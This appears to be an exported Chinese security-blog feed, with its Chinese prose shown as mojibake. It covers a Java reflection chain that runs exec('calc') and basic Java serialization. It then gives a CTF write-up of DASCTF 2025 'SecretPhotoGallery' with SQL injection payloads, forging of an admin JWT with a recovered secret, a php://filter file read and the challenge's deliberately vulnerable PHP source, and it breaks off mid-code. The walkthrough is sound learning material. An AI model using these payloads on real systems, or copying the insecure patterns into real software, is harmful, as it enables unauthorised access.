ä¸ª<code>Dog</code>å¯¹è±¡ï¼Œå®ä¾‹åŒ–æ—¶çš„å‚æ•°åˆšå¥½èƒ½ä¸€ä¸€å¯¹åº”</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> setDog(Runtime.class,<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> setDog(Runtime.class,<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> setDog(Runtime.class,<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>åŸé¢˜å¯¹ä¸‰ä¸ª<code>Dog</code>å¯¹è±¡è¿›è¡Œäº†é“¾å¼è°ƒç”¨ï¼Œè¿™é‡Œçš„ä¸‰ä¸ª<code>Dog</code>å¯¹è±¡å…¶å®åªæœ‰ç¬¬ä¸€ä¸ªå¯¹è±¡çš„<code>Runtime.class</code>è¢«ä½¿ç”¨äº†ï¼Œå…¶ä»–çš„éƒ½è¢«å¾ªç¯è¦†ç›–æ‰äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">chainWagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Dog dog : <span class="built_in">this</span>.dogs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">                input = dog.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);</span><br><span class="line">            input = result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è°ƒç”¨äº†<code>Runtime.class.getMethod(&quot;getRuntime&quot;, null);</code>ï¼Œå¾—åˆ°<code>Runtime.getRuntime()</code>æ–¹æ³•çš„<code>Method</code>å¯¹è±¡</p><p>ç¬¬äºŒæ¬¡è°ƒç”¨äº†<code>getRuntime.invoke();</code>ï¼Œå¾—åˆ°äº†ä¸€ä¸ª<code>Runtime</code>å®ä¾‹</p><p>ç¬¬ä¸‰æ¬¡è°ƒç”¨äº†<code>runtimeInstance.exec(&quot;calc&quot;);</code>å¯åŠ¨äº†è®¡ç®—å™¨è¿›ç¨‹</p><br/><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>åœ¨Javaä¸­ï¼Œåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚æµè¾“å‡ºçš„è¿‡ç¨‹ï¼Œååºåˆ—åŒ–åˆ™æ˜¯å…¶é€†è¿‡ç¨‹ã€‚è‹¥è¦è®©ä¸€ä¸ªç±»å…·æœ‰åºåˆ—åŒ–èƒ½åŠ›ï¼Œéœ€è¦è°ƒç”¨<code>Serialize</code>æ¥å£ï¼Œè¯¥æ¥å£ä¸éœ€è¦å®ç°ä»»ä½•æ–¹æ³•ï¼Œç”¨æ¥æ ‡è¯†è¯¥ç±»å¯ä»¥è¿›è¡Œåºåˆ—æ¶åŒ–æ“ä½œã€‚åœ¨Javaä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å¯è‡ªå®šä¹‰ç¨‹åº¦æ˜¯éå¸¸é«˜çš„ï¼Œä¸åŒçš„å¼€å‘è€…éƒ½å¯ä»¥è‡ªå·±å®šä¹‰å‡ºä¸€å¥—ç‹¬ç‰¹çš„åºåˆ—åŒ–é€»è¾‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String base64Data)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        ByteArrayInputStream bais=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64Data));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œè¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„å®åˆ™åªæœ‰<code>oos.writeObject(obj);</code>è¿™ä¸€è¡Œä»£ç ï¼Œååºåˆ—åŒ–æ“ä½œä¹Ÿåªæœ‰<code>ois.readObject();</code>æ˜¯åœ¨ä»å­—èŠ‚æµä¸­è¯»å–å¯¹è±¡ã€‚å­¦ä¹ äº†ä¸€äº›JavaåçŸ¥é“ï¼Œç”±äº<code>writeObject()</code>å’Œ<code>readObject()</code></p><p>åˆ†åˆ«æ˜¯<code>ObjectOutputStream</code>å’Œ<code>ObjectInputStream</code>ç±»ä¸­å…·æœ‰çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬äºŒè¡Œä¹Ÿä¸éš¾ç†è§£ã€‚ç¬¬ä¸€è¡Œçš„ä½œç”¨æ˜¯åˆ›å»ºå†…å­˜ç¼“å†²åŒºï¼Œè¿™ä»£è¡¨æˆ‘ä»¬åºåˆ—åŒ–çš„å¯¹è±¡ä¼šè¢«æ”¾å…¥å†…å­˜ä¸­å­˜å‚¨ï¼Œç„¶åå°†å†…å­˜ä¸­çš„æ•°æ®è¿›è¡Œç¼–ç åè¿”å›ã€‚é™¤æ­¤ä»¥å¤–ï¼Œè¿˜å¯ä»¥å°†åºåˆ—åŒ–åçš„æ•°æ®å†™å…¥æ–‡ä»¶æˆ–è€…è¿›è¡Œå‹ç¼©ã€åŠ å¯†ç­‰æ“ä½œï¼Œè‡ªå®šä¹‰ç¨‹åº¦æé«˜</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾è¦åºåˆ—åŒ–çš„ç±»ä¸­æœ‰transientå­—æ®µ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// å…ˆæ‰§è¡Œé»˜è®¤åºåˆ—åŒ–</span></span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">        <span class="comment">// é¢å¤–åºåˆ—åŒ–transientå­—æ®µï¼ˆè‡ªå®šä¹‰åŠ å¯†ï¼‰</span></span><br><span class="line">        oos.writeUTF(encrypt(<span class="built_in">this</span>.password));</span><br><span class="line">        <span class="comment">// æ·»åŠ æ—¶é—´æˆ³</span></span><br><span class="line">        oos.writeLong(System.currentTimeMillis());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> </span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// å…ˆæ‰§è¡Œé»˜è®¤ååºåˆ—åŒ–</span></span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// è¯»å–å…ƒæ•°æ®ï¼ˆä½†ä¸å­˜å‚¨åˆ°å­—æ®µï¼‰</span></span><br><span class="line">        <span class="built_in">this</span>.password = decrypt(ois.readUTF());</span><br><span class="line">        <span class="comment">// è¯»å–é¢å¤–ä¿¡æ¯</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">timestamp</span> <span class="operator">=</span> ois.readLong();</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–æ—¶é—´: &quot;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>(timestamp));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p><code>Serialize</code>æ¥å£çš„å®ç°ç±»éƒ½ä¼šè®¡ç®—å‡ºä¸€ä¸ª<code>serialVersionUID</code>å¸¸é‡ï¼Œååºåˆ—åŒ–æ—¶è®¡ç®—å‡ºæ¥çš„æ•°å€¼ä¸JVMè¿è¡Œä¸­ç±»çš„å€¼ä¸ä¸€è‡´ä¼šé€ æˆ<code>InvalidClassException</code>å¼‚å¸¸ï¼Œå¯ä»¥åœ¨è¦åºåˆ—åŒ–çš„ç±»ä¸­å£°æ˜è¯¥å€¼ä»¥é¿å…æŠ¥é”™</p><br/>]]></content>
      
      
      <categories>
          
          <category> é›¶ç¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> æ‹¾é—è¡¥é˜™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•£é¢˜12.10</title>
      <link href="/2025/12/10/%E6%95%A3%E9%A2%9812-10/"/>
      <url>/2025/12/10/%E6%95%A3%E9%A2%9812-10/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF-2025ä¸‹åŠå¹´èµ›-SecretPhotoGallery"><a href="#DASCTF-2025ä¸‹åŠå¹´èµ›-SecretPhotoGallery" class="headerlink" title="[DASCTF 2025ä¸‹åŠå¹´èµ›]SecretPhotoGallery"></a>[DASCTF 2025ä¸‹åŠå¹´èµ›]SecretPhotoGallery</h1><blockquote><p>This is a mysterious gallery system, but the sqlite database is empty, is it?</p></blockquote><p>æ‰“å¼€æ˜¯ç™»å½•ç•Œé¢ï¼Œé¢˜ç›®è¯´äº†æ˜¯sqliteæ•°æ®åº“ï¼Œç”¨<code>1&#39; and 1=1</code>æµ‹è¯•å­˜åœ¨æ³¨å…¥æŠ¥é”™ï¼Œç”¨<code>&#39; ORDER BY 4--</code>ç¡®å®šåˆ—æ•°ä¸º3ï¼Œåé¢<code>&#39; UNION SELECT &#39;col1&#39;,NULL,NULL--</code>æµ‹è¯•æ˜¾ç¤ºæ•°æ®æ—¶ç›´æ¥ç™»è¿›å»äº†ï¼Œç¥ç§˜ï¼Œä¸æ˜¯å¤ªç†è§£</p><p>ç™»è¿›å»åæ˜¯<code>gallery.php</code>è·¯ç”±ï¼Œé¡µé¢æœ‰æç¤º</p><blockquote><p>Youâ€™ve successfully entered the gallery. Your authentication token shows youâ€™re a <strong>guest</strong> user.</p></blockquote><p>çœ‹çœ‹cookieï¼Œæ˜¾ç¤º</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiJyBVTklPTiBTRUxFQ1QgJ2NvbDEnLE5VTEwsTlVMTC0tIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY0OTk0ODEwfQ.SYBQFPNuD60CywLf9_C-_sJ3dGwd-9p_4sW8jzqq-lU</span><br></pre></td></tr></table></figure><p>cookieè¢«<code>.</code>æ‹†æˆäº†ä¸‰éƒ¨åˆ†ï¼Œæ˜¯JWTå¯†é’¥ï¼Œæ¥ä¸‹æ¥å°è¯•è·å–JWTå¯†é’¥ã€‚ä½¿ç”¨<code>hashcat</code>ç”¨<code>rockyou.txt</code>å­—å…¸çˆ†ç ´å¤±è´¥ï¼Œ<code>rockyou.txt</code>æœ‰å‡ åƒä¸‡æ¡æ•°æ®éƒ½ä¸åŒ¹é…ï¼Œè¯´æ˜å¯†é’¥æ˜¯è—èµ·æ¥äº†</p><p>åœ¨<code>gallery.php</code>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°æ¯å¼ å›¾ç‰‡ä¸Šé¢éƒ½æœ‰ç¥ç§˜æ³¨é‡Šï¼Œæ¯”å¦‚ç¬¬ä¸€å¼ å›¾ç‰‡æ˜¯<code>&lt;!-- Photo 1: G --&gt;</code>ï¼ŒæŠŠ17å¼ ç…§ç‰‡çš„æ³¨é‡Šå­—ç¬¦ç»„åˆå¯ä»¥å¾—åˆ°<code>GALLERY2024SECRET</code>ï¼Œè¿™å°±æ˜¯JWTå¯†é’¥ï¼Œç”¨åœ¨çº¿çš„JWTå¯†é’¥ç”Ÿæˆå™¨ï¼ŒæŠŠ<code>guest</code>å±æ€§æ›´æ”¹ä¸º<code>admin</code>ï¼Œåˆ·æ–°é¡µé¢å¯ä»¥è¿›å…¥ä¸€ä¸ªæ–°è·¯ç”±<code>admin.php</code></p><p>è¯¥è·¯ç”±æ˜¯ä¸€ä¸ªæ–‡ä»¶è¯»å–é¡µé¢ï¼Œç»è¿‡æµ‹è¯•å¯ä»¥åˆ©ç”¨ç»å¯¹è·¯å¾„è¯»å–ä»»æ„æ–‡ä»¶ï¼Œä½†æ˜¯<code>flag.txt</code>æ˜¯ä¸å­˜åœ¨çš„ï¼Œä½¿ç”¨ä¼ªåè®®<code>php://filter/convert.iconv.utf-8.utf-16/resource=index.php</code>å¯ä»¥è¯»å–ä¹‹å‰çš„æºç </p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// JWT Helper Functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createJWT</span>(<span class="params"><span class="variable">$payload</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$header</span> = <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;typ&#x27;</span> =&gt; <span class="string">&#x27;JWT&#x27;</span>, <span class="string">&#x27;alg&#x27;</span> =&gt; <span class="string">&#x27;HS256&#x27;</span>]);</span><br><span class="line">    <span class="variable">$header</span> = <span class="title function_ invoke__">base64UrlEncode</span>(<span class="variable">$header</span>);</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$payload</span>));</span><br><span class="line">    <span class="variable">$signature</span> = <span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;<span class="subst">$header</span>.<span class="subst">$payload</span>&quot;</span>, <span class="variable">$secret</span>, <span class="literal">true</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;<span class="subst">$header</span>.<span class="subst">$payload</span>.<span class="subst">$signature</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If already logged in, redirect to gallery</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gallery.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Initialize database</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/tmp/gallery.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create users table (empty database)</span></span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Vulnerable SQL query - direct string concatenation</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">        <span class="comment">// Generate JWT token with weak secret</span></span><br><span class="line">        <span class="comment">// The secret will be hidden in the gallery photos!</span></span><br><span class="line">        <span class="variable">$jwtSecret</span> = <span class="string">&#x27;GALLERY2024SECRET&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span> = [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span> =&gt; <span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;iat&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>()</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">createJWT</span>(<span class="variable">$payload</span>, <span class="variable">$jwtSecret</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set JWT as cookie</span></span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="variable">$token</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Also keep session for compatibility</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gallery.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;Invalid username or password!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>gallery.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if logged in via JWT cookie</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Decode JWT to get username (basic decoding, no verification here)</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"><span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) === <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$parts</span>[<span class="number">1</span>], <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>)), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$payload</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line">    <span class="variable">$role</span> = <span class="variable">$payload</span>[<span class="string">&#x27;role&#x27;</span>] ?? <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// JWT Helper Functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$data</span>, <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyJWT</span>(<span class="params"><span class="variable">$token</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$header</span>, <span class="variable">$payload</span>, <span class="variable">$signature</span>) = <span class="variable">$parts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Verify signature</span></span><br><span class="line">    <span class="variable">$validSignature</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;<span class="subst">$header</span>.<span class="subst">$payload</span>&quot;</span>, <span class="variable">$secret</span>, <span class="literal">true</span>)), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$signature</span> !== <span class="variable">$validSignature</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decode payload</span></span><br><span class="line">    <span class="variable">$payloadData</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$payload</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$payloadData</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if JWT token exists</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to decode JWT (we need to know the secret!)</span></span><br><span class="line"><span class="comment">// The secret is hidden in the gallery photos: GALLERY2024SECRET</span></span><br><span class="line"><span class="variable">$jwtSecret</span> = <span class="string">&#x27;GALLERY2024SECRET&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">verifyJWT</span>(<span class="variable">$token</span>, <span class="variable">$jwtSecret</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$payload</span>) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;Invalid JWT token! Unable to verify signature.&quot;</span>;</span><br><span class="line">    <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$payload</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;Unknown&#x27;</span>;</span><br><span class="line">    <span class="variable">$role</span> = <span class="variable">$payload</span>[<span class="string">&#x27;role&#x27;</span>] ?? <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="variable">$isAdmin</span> = (<span class="variable">$role</span> === <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle file export functionality</span></span><br><span class="line"><span class="variable">$fileContent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$exportError</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$exportSuccess</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$isAdmin</span>) &#123;</span><br><span class="line">        <span class="variable">$exportError</span> = <span class="string">&quot;Access Denied! Only admin users can export files.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;export&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filepath&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">                <span class="variable">$exportError</span> = <span class="string">&quot;Please specify a file path!&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Filter dangerous wrappers</span></span><br><span class="line">          